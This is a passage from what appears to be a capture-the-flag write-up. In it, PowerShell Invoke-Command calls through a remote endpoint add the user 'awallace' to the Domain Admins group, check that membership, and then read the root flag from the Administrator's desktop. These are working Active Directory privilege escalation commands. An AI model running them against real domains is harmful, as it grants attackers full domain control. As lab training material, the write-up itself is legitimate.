Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net group "Domain Admins" awallace /add /domain }

Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net group "Domain Admins" /domain }

Administrator            awallace
```

Should work after few minutes…

Now we can get the flag

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat 'C:\Users\Administrator\Desktop\root.txt' }
```